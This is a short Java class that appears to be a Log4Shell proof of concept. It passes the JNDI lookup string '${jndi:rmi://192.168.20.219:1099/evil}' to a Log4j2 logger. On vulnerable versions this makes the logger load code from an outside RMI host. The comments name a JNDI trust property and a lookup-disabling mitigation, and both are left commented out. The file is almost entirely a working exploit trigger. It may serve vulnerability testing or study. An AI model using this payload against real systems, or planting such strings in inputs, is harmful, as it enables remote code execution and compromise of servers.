package com.halibobo.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {
  static {
    // Note This parameter looks useless.
    // System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
    // this works well
    // System.setProperty("log4j2.formatMsgNoLookups","true");
  }
  private static final Logger Logger = LogManager.getLogger();

  public static void main(String[] args) {
    String username = "${jndi:rmi://192.168.20.219:1099/evil}";
    Logger.info("hello, {}" ,username);
  }
}
